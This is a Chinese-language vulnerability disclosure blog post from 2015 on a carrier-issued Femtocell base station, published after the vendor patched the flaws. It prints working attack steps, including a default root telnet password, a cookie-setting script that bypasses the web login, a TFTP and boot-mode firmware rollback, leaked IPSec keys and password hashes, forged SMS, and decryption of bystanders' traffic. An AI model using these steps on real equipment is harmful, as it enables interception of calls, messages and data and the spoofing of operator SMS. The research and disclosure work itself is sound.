---
layout: post
title:  "阿里移动安全与泰尔无线技术部联合发现Femtocell安全漏洞"
date: 2015-06-19 12:00:00
---


阿里移动安全团队与中国泰尔实验室无线技术部的通信专家们一起, 联合对国内运营商某型Femtocell基站进行了安全分析, 发现多枚重大漏洞, 可导致用户的短信、通话、数据流量被窃听. 恶意攻击者可以在免费申领一台Femtocell设备之后, 迅速地将其改造成伪基站短信群发器和流量嗅探器, 影响公众的通信安全. 
 
家庭基站(Femtocell, 又称飞蜂窝, Femto本意是10的-15次方)是运营商为了解决室内覆盖问题而推出的基于IP网络的微型基站设备, 通常部署在用户家中, 甚至直接放在桌面上.  随着运营商网络建设基本完成, 宏站基本不再增加, Femtocell作为网优阶段解决信号覆盖盲区最有效的手段, 倍受运营商青睐. 由于Femtocell通过IP与运营商核心网直接连接, 并从用户侧来看, 是完全合法的基站设备. 

Femtocell一般安装在用户触手可及的位置上, 这就使得一直躲在通信机房这一天然物理安全屏障庇护下的传统通信厂商, 终于要接受天下黑客的检阅了. 然而, 传统通信厂商在开发过程中的安全意识淡薄, 导致了通信设备的安全漏洞比比皆是. 近年来, BlackHat、DEFCON等安全大会上多次曝出Femtocell的安全问题. 

漏洞细节已于2015年5月21日通报相关运营商, 相关厂家已经针对此漏洞对全网设备进行了紧急修复, 目前漏洞已经修复完成. 出于推进安全研究的考虑, 现在将漏洞的细节公开. 

阿里移动安全将继续与运营商、监管部门一道, 为移动通信安全做出更多的贡献, 保障亿万移动互联网用户的信息安全. 

## 1 板卡概览

### 1.1 设备的获得

如何获得一台Femtocell设备呢? 

在2015年4月初, 我给10086打电话, 报告说屋子里的信号很差(事实的确如此). 10086说如果家里有宽带, 可以免费安装一台小基站. 过了两天, 安装的工程师就上门来装了. 

![]({{ site.imageurl }}/femtocell/FemtoCell1.png)

Femtocell设备典型的安装位置如下图所示:

![]({{ site.imageurl }}/femtocell/femtocell-location-example.jpg)

最大发射功率在30dBm, 只有1W. 而一般的GSM基站功率大约在20W左右. 

Femtocell安装之后, 效果的确非常好. 原来室内GSM信号只有一格, 偶尔会"无信号", 屋里的手机经常打不通. Femtocell开机之后, 信号顿时变成满格, 但制式是GPRS. 大家家里没信号的话, 可以打电话给10086申请, 而且申请也是免费的. 而且后续的话, 运营商已经在准备3G和4G的Femtocell了. 比需要架室外和室内天线的直放站方案稳定很多, 而且架设方便. 

在2014年10月, 乌云上已经有人提交了Femtocell的[漏洞一枚](http://www.wooyun.org/bugs/wooyun-2014-078512). 据乌云上的记录, 在2015年1月被修复完成, 漏洞公开. 受这篇文章的启发, 我们继续对Femtocell设备进行安全分析. 发现了一些新的漏洞, 并且旧的漏洞修复的也不彻底. 

### 1.1 硬件组成

拆开发现里面有两块电路板, 二者通过自定义标准的线缆相连, 初步猜测线缆中至少有网络线缆4根. 

一块是普通的WLAN AP, 上面有Atheros的SoC芯片, 与一般家用路由器无异. 

![]({{ site.imageurl }}/femtocell/Board4.png)

另一块用于射频的板卡, 主要由以下三部分组成:

- TI的345MHz的DSP+ARM处理器[OMAPL138B](http://www.ti.com/lit/ds/sprs815c/sprs815c.pdf)
- Cyclone的FPGA
- RF捷变器AD9365(左下角)

![]({{ site.imageurl }}/femtocell/Board1.png)


### 1.2 网络拓扑


    +-------------------------+                +----------------+
    | WLAN Device (Linux)     |                | SeGW           |
    |                         |                | (IPSec Gateway)|
    | WAN: (DHCP)             |...... ADSL ....| 111.206.50.34  |
    | LAN: 192.168.197.1/24   +-----+        +-|                |
    +-------------------------+     |        | +-------+--------+         
                                    |        |         |
    +-------------------------+     |        | +-------+------------+
    | RF Device (VxWorks)     |     |        | | HMS 172.16.15.0/24 |
    |                         |     |        | +--------------------+
    | LAN: 192.168.197.241/24 |-----+        |
    | IPSec:  10.37.52.240/16 |     |        | +--------------------+
    +-------------------------+     |        +-|     10.1.0.0/16    |
                                    |          +--------------------+
                                    |
    +-------------------------+     |
    | Laptop                  |     |
    | LAN: 192.168.197.100/24 |-----+
    +-------------------------+

## 2 WLAN 板卡渗透

### 2.1 root弱密码

可以直接telnet登录, 然后就是一个拥有root权限的Linux shell了. 

    $ telnet 192.168.197.1
    login: root
    password: 5up
    
顺便提一句, 这个密码应该是Atheros的参考设计板[PB44](http://wiki.openwrt.org/toh/evaluation.boards/pb44)的默认密码, 很多厂商拿来都不改. 在搜索引擎上以"5up"和"root"为关键词, 可以搜索到不少有趣的东西. 

并且发现上面的`busybox`基本没有裁剪, 甚至连`tcpdump`功能都有. 

于是, 可以直接抓取到所有连上此WiFi的流量:

    busybox tcpdump -i br0 not port 23
    

### 2.2 其它利用方式

- `/mnt/flash/nvm/femtoOamStore.db` 是 Sqlite3 的文件, 可以使用`sqlitebrowser`直接查看
- 闪灯 `/mnt/flash/led_ctrl.sh [on|off]`


## 3 RF 板卡渗透

### 3.1 Web 登录绕过

访问 <http://192.168.197.241/C/userProcessFunction.asp?reqType=4&role=marketUser> 获得用户名为

    abmoc@24320

然后在`USER.js`里发现原有的登录绕过问题没有得到修复, 于是在浏览器中打开Console, 输入以下脚本即可登录:

    SetCookie('role', 'marketUser');
    SetCookie('username', 'abmoc@24320'); 
    SetCookie('levels', [-2, 0, 1, 3, 11, 13, 15, 16]); 
    document.cookie = "loginFlag=1;";
    window.top.location = 'main.asp?r=' + Math.random() + '#index';

登录之后, 我们就拥有了与运营商派过来开站的工程师完全一样的操作权限! 

以下是一些管理界面截图:

![]({{ site.imageurl }}/femtocell/web-3.png)
![]({{ site.imageurl }}/femtocell/web-5.png)
![]({{ site.imageurl }}/femtocell/web-6.png)

然而发现乌云上之前曝出的文件上传下载的接口, 以及欢迎短信下发的接口代码已经完全被**删除**了! 但是真的删除了吗? 


### 3.2 Boot

看起来WEB上做不成啥事情, 于是在UART插座接上串口线, 转战硬件层. 

首先看到引导信息是

    CPU: TI OMAP-L138 - ARM926E (ARM)
    Version: VxWorks 6.8
    BSP version: 2.0/1
    Creation date: Sep 26 2012, 10:26:36

发现跑的操作系统是VxWorks, 引导结束之后, 提示输入用户名和密码. 暂时没有思路, 于是尝试进入Boot模式. 

在看到

    Press any key to stop auto-boot...

之时, 敲击键盘, 进入VxWorks Boot. 由于是一个陌生的环境, 首先打问号看帮助. 发现有几条命令可以用. 

但是`ls`命令只能看文件名, 不能看文件内容. 此外, 发现还有`cp`和`rm`两条命令可以用. 面对着大把大把的文件, 只能看文件名, 不能看文件内容, 好着急. 

#### 3.2.1 下载所有文件

VxWorks正常引导开机之后, 扫描了一下端口, 发现`UDP/69`端口打开. 这个是TFTP(Trivial File Transfer Protocol)的端口. 许多嵌入式设备都使用TFTP协议来传输固件. 

于是在电脑上试图上传一个本地文件:

    $ tftp
    tftp> connect 192.168.197.241
    tftp> put a.txt

然后再尝试下载, 发现

    tftp> get a.txt
    xx bytes transfered..

说明上传成功. 重启之后, 发现文件仍然可以被`tftp get`到. 

然后进去VxWorks Boot, 发现上传的文件在`/tffs0/wlanBackup/`里. 看来, 基站厂商还是对tftp的操作做了一些限制, 把文件上传下载限制到了这个目录里面. 

但是, 不要忘了, 我们在Boot模式下, 还有`cp`和`mv`和`rm`命令. 于是, 剩下的工作就是辛苦的把其它目录的文件, 一个一个地`cp`到`wlanBackup`目录里, 然后再`tftp get`下来. 

至此, 我们就可以把VxWorks系统里的所有文件都拉回到本地, 进行分析. 

![]({{ site.imageurl }}/femtocell/directory-user2.png)

#### 3.2.2 修改Startup: 伪造短信重见天日

然后四处看一看文件, 发现`/tffs0/common/startup.txt`里面写着一行:

    /tffs0/user2

十分可疑! 

再调查一下`/tffs0/user1`目录中, 把`OAM.zip`解压之后, 发现就是乌云曝出有漏洞的那个版本的程序. 

于是上传一个新的`startup.txt`, 里面写成

    /tffs0/user1

重启引导, 发现之前的 `debug / 2342@WAS_ap` 密码就可以直接用了, 以及文件上传下载, 以及欢迎短信的漏洞就都可以利用了. 利用方式在乌云的文章上已经有详细描述, 在此不再赘述. 

原来, 基站厂家的工程师, 在上一次全网设备更新的时候, 没有删除有漏洞的程序, 而是把新的程序放在了`/tffs0/user2`目录里面, 然后通过`startup.txt`指过去了. 

下图左侧是我以中国联通10010的身份, 伪造下发的短信, 注意看时间是在2015年4月20日. 右侧是伪造的欢迎[闪信(Flash SMS)](https://en.wikipedia.org/wiki/Short_Message_Service#Flash_SMS)

![]({{ site.imageurl }}/femtocell/WelcomeMessage.png)


这样下发的短信, 实际上是由"真基站"发送下来的, 而且这种短信不需要Femtocell与核心网之间通信, 核心网无从监管Femtocell下达的欢迎短信是什么, 并且可以任意修改欢迎短信的发件人和内容. 欢迎短信的功能, 原本只是用于提示用户已经加入了新的小区而已, 这是系统的设计漏洞. 此外, 它的`ARFCN`和`CellID`等参数与真基站无异, 这样一来, 试图通过基站参数进行伪基站检测的方案都将失效. 


### 3.3 IPSec 分析: 捕获用户明文数据流量

继续调查, 发现VxWorks版卡的串口输出中有如下字样:

    secIpAddr:111.206.50.34
    seckey:combaipsec2011
    secUseImsi:9999990000xxxxx
    ipSecRekeyTime:80000minutes
    liveness:0
    comba_usim_card_auth: use virtual usim card.
    mac ok
    0xc474d788 (ipiked):
    ipsecStart() done
    Ipsec Ip : 10.37.52.240
    Enc key inbound:9ab3eb22 2b4917e1 4a50ddae e4e5f3ba 064494c6 f1cc6873
    Enc key outbound:f8ac6c27 c4000a72 dd26156c afff5c99 9ea2894e 429ef824
    Auth key inbound:152b81aa 92456554 6f1cbb38 2f5461c8 33e2211d
    Auth key outbound:e6af8105 b73edc29 13791638 3f8c65fc 224c0688
    add net 10.1.0.0: netmask 255.255.0.0: gateway 10.37.52.240
    add net 172.16.15.0: netmask 255.255.255.0: gateway 10.37.52.240
    add host 111.206.50.34: gateway 192.168.197.1
    
上面日志里打出的`seckey:combaipsec2011`, 在相关的论文中也有描述, 是开发过程中, 项目组为了方便调试, 使用的IPSec PSK认证方式, 在投入生产环境部署的时候, 已经关闭了这种认证方式了. 

现在IPSec使用的认证方式是EAP-AKA, 基于模拟USIM卡的认证. 具体细节可以参阅[RFC4187](https://tools.ietf.org/html/rfc4187). 

#### 3.3.1 认证原理

EAP-AKA的认证方式, 简单描述如下:

局端的SeGW(Security Gateway, 实际上是IPSec Server)后面跟着一个RADIUS认证服务器, 里面写了若干条认证五元组(Quintuplet). 

    IMSI: RAND,XRES,CK,IK,AUTN
    
认证开始时, Femtocell先上报自身的IMSI. SeGW收到认证请求后, 取出与IMSI对应的一条五元组, 并把这条五元组标记为已经使用. 将里面的随机数挑战`RAND`和鉴权令牌`AUTN`发给Femtocell. Femtocell先通过验证`AUTN`, 从来验证SeGW是否是真的. 验证通过之后, 再根据Femtocell装载的USIM卡里的`Ki`和`OPc`密钥, 以及随机挑战`RAND`, 算出一个应答`RES`和两个密钥`CK`和`IK`. 然后把`RES`传回给SeGW, SeGW核对`RES`和存在五元组里的`XRES`是否一致, 从而完成对手机的认证. 注意, 协商出来的密钥`CK`和`IK`, 在全过程中不会被传输, 传输的只是`RAND`和`XRES`以及`AUTN`, 即使通信被窃听, 也无法获得加密密钥. 

以上即是Femtocell与SeGW之间的认证过程. 实际上, 把"Femtocell"的字眼换成"手机", "SeGW"的字眼换成"基站", 就描述了手机与基站之间的认证过程, 两种场景下的认证过程基本上是一致的. 

#### 3.3.2 抓包分析: ESP解密

首先对VxWorks建立IPSec隧道时的IKEv2(UDP 500端口)的协议抓包分析, 得到它协商出的加密方式如下:

    Encryption Algorithm :  ENCR_3DES
    Integrity Algorithm :  AUTH_HMAC_SHA1_96
    Pseudo-random Function (PRF) :  PRF_HMAC_SHA1
    Diffie-Hellman Group (D-H): Alternate 1024-bit MODP group
    
于是, 打开Wireshark, 在抓到的ESP(Encapsulating Security Payload)包上面, 右键, 将上述输出中的`Enc key`填写到Wireshark的`Encryption Key`字段, 将上述输出中的`Auth key`填写到Wireshark的`Authentication Key`字段中. 

注意, IPSec隧道流量的两个方向, 分属不同的 SA(Security Association) 和 SPI(Security Parameter Index), 因此需要把`inbound`这一组Key应用到`SeGW->Femtocell`方向的流量上, 并且把`outbound`这一组Key应用到`Femtocell->SeGW`方向的流量上. 

上述日志打出的Key, 需要改写成形如`0x9ab3eb222b4917e14a50ddaee4e5f3ba064494c6f1cc6873`之后, 才可以填入Wireshark中. 

![]({{ site.imageurl }}/femtocell/wireshark-esp.png)

填写完成之后, 原来只能显示为ESP的数据包, 即被解密. 

#### 3.3.3 解密后的流量

继续分析, 发现解密后的数据包有以下几种类型:

 - HNBAP: Home Node-B Application Part
 - RANAP: Radio Access Network Application Part
 - ICMP: Internet Control Message Protocol (就是ping啦)
 - RTP: Real-time Transport Protocol 
 - SCTP: Stream Control Transmission Protocol (上面跑有SS7,7号信令)
 - NTP: Network Time Protocol (用于Femtocell上电校时)
 - GTP: GPRS Tunneling Protocol (手机的数据流量)

这些协议之间的关系如下图所示:

![]({{ site.imageurl }}/femtocell/protocol-sets.png)


下图中, 可以看到以GTP形式封装的用户数据, 里面有一个HTTP请求. 

![]({{ site.imageurl }}/femtocell/wireshark-GTP.png)

下图中, 看到Femtocell开机之后, 正在使用NTP协议进行时间校准. 

![]({{ site.imageurl }}/femtocell/wireshark-ntp.png)

下图中, 可以看到Femtocell向上发起注册请求, 以及SeGW下发的注册成功的消息. 并且, LAC(Location Aera Code)也在数据报文中. 

![]({{ site.imageurl }}/femtocell/wireshark-lac.png)

特别注意到的是, 附近某个人在不知情的情况下, 连上了这台Femtocell. 可以看到这台手机的型号是`三星 GT-I9308`, 跑着`Android 4.3`系统, 手机后台通过GPRS产生的流量, 被我们看的清清楚楚. 

![]({{ site.imageurl }}/femtocell/userdata-4.png)

下图中可以看出, 后台有360和QQ在上传的一些统计信息. 

![]({{ site.imageurl }}/femtocell/userdata-5.png)

![]({{ site.imageurl }}/femtocell/userdata-6.png)

![]({{ site.imageurl }}/femtocell/userdata-3.png)


下图中可以看到, 我们还捕获到了用户的IMSI号, 并且可以通过反查来得到用户的手机号前几位. 

![]({{ site.imageurl }}/femtocell/wireshark-IMSI.png)

用户的语音和短信在RTP报文里. 

#### 3.3.4 潜在风险: 伪造客户端

    123456789012345567890123456789012345678901234567
    123456789012345567890123456789012345678901234567
    9999990000*****@strongswan.org

上述文件是`/tffs0/common/imsi.cfg`.  其中写了虚拟IMSI参数: Ki和OPc密钥, 以及IMSI号. 这些参数供Femtocell与通信机房里的SeGW(Security Gateway, 实际上是IPSec网关)建立安全连接. 

Femtocell与SeGW之间的IPSec协议建立, 需要使用真实的USIM卡, 来完成基于EAP-AKA的双向鉴权. Femtocell设备的底部即有一个USIM卡插槽. 但是厂家为了调测以及管理方便, 使用了虚拟USIM卡的方案, 把鉴权所需要的参数, 写在上述`imsi.cfg`文件中, 这样便无需管理大量的USIM卡. 

真实的USIM卡中存的也只有IMSI/Ki/OPc三个参数, 因此只需要把上述三个参数写到文件中, 并在VxWorks程序中模拟3GPP中所需要的Milenage算法, 即可完成相应的EAP-AKA鉴权过程. 

关于Femtocell对应的SeGW, 在《基于IPSec-VPN的数字证书认证技术的研究与实现》论文中有提到, 使用了Radisys公司的解决方案, 是刀片式计算机, 搭载有Cavium公司的OCTEON处理器. 

如果后续继续对取得的VxWorks固件进行逆向分析, 将有可能模拟出登录过程, 从而使用IPSec VPN拨通SeGW, 从而连入Femtocell通信内网. 

### 3.4 其它利用

#### 3.4.1 TCP 50000 控制端口 (LMT)

这是一个由该Femtocell厂家自己编写的telnet server. 但是! 以**任意用户名**和**任意密码**皆可登录. (实在无法理解...)

指令的描述位于 `/tffs0/user2/OAM/software/web/web_page/webCommTab.txt`

以下摘录一部分:

	OAM参数配置;SON参数配置;调试命令;ATS定标;业务参数配置;
	#设备基本信息
	set DeviceInfo : EnabledOptions=1,AdditionalHardwareVersion="HW0001",AdditionalSoftwareVersion="ASW0001",ProvisioningCode="Comba",DeviceStatus="1",UpTime=1,FirstUseDate="1",DeviceLog="1",FtpIp="192.168.1.8";
		
	#设备网管管理服务器参数
	set ManagementServer : URL="http://10.3.0.130:8081/ACS/HMSServlet",Username="admin",Password="admin",PeriodicInformEnable=1,PeriodicInformInterval=10,PeriodicInformTime="0",ParameterKey="123",ConnectionRequestUsername="admin",ConnectionRequestPassword="admin",UpgradesManaged=1;
		
	#周期性复位
	set PeriodicReboot : PeriodicRebootEnable=1,PeriodicRebootTime="02:00-05:00";
	...下略...


实际操作结果示例: (不要忘记命令末尾的分号)

    COMBA telnet server 0.1
    welcome ...
    login user: a
    login pwd: a
    Login successfully.
    -> get DeviceInfo;
    CMD : get DeviceInfo......[OK]
    RESULT : ACK 000
    HINT : get DeviceInfo success!
    CONTENT : DeviceInfo
    Manufacturer = "Comba"
    ManufacturerOUI = "00271D"
    ModelName = "HNB-10,A01L"
    Description = "GSM_IB-WAS"
    ProductClass = "GSM_N2"
	...下略...


这样任何人都可以直接通过telnet登入此界面, 修改任意的通信参数了. 


#### 3.4.2 TCP 50005 端口

50005端口只允许被WLAN板卡 192.168.197.1 访问. 

简单抓包分析发现, 这是厂家自定义的一种通信协议, 供WLAN板卡读取此端口以获得RF板卡的工作状态. 并且工作状态在WLAN板卡的`/tmp/`目录下有对应的文件记录. 


#### 3.4.3 密码

VxWorks板卡网页的的登录密码位于 `/tffs0/user2/OAM/software/web/web_page.xml` 里

    abmoc@24320 e29c21956e290b8e76b22bec66f4e8c7
    comba e10adc3949ba59abbe56e057f20f883e (即123456)
    admin e10adc3949ba59abbe56e057f20f883e (即123456)
    Comba_IB-WAS 1ebe493b3a9ba02373190df07d031964 (即2342@WAS_ap)

#### 3.4.4 基站的通信网参数

位于 `/tffs0/user1/oam.db`, 依然是sqlite数据库. 

此外, 我们在Femtocell的网页Javascript中, 也发现了针对TD-SCDMA、4G等版本的适配代码. 通过其它渠道也得知, 运营商正在积极地推进4G Femtocell的部署. 


## 后记

由于通信行业封闭而不透明的传统, 运营商网络如GPRS/3G/LTE中所潜在的安全风险, 一直没有得到充分的暴露. 近年来GSM"伪基站"暴露出的通信安全问题, 已经逐渐让大家对通信安全有了一些担忧. 随着移动互联网业务的迅猛发展, 特别是无线支付业务发展, 运营商网络中所承载的数据流量对于黑客越来越有价值. 

希望通信设备厂商能够勇敢地面对互联网时代的安全浪潮, 从开发流程中开始重视安全, 多借鉴互联网行业中所使用的成熟的安全审计工作流程和策略, 避免因设备漏洞造成更大的危害. 

## 作者 

本工作主要由阿里移动安全团队的安全专家王康(五达)完成. 感谢中国泰尔实验室无线技术部桂丽等通信专家的支持, 以及阿里移动安全的汉本、成淼对本研究提供的帮助. 

王康, 清华大学工程物理系核工程与核技术专业, 曾为Linux Kernel贡献过代码, 现为阿里巴巴安全部移动安全团队安全专家. 研究方向为智能硬件、通信网、物联网等方向的安全. 

![]({{ site.imageurl }}/femtocell/alibaba-mobile-security.png)

[来源: 阿里聚安全博客](http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.3zwaJ3&id=73)

[来源: FreeBuf](http://www.freebuf.com/articles/wireless/70458.html)
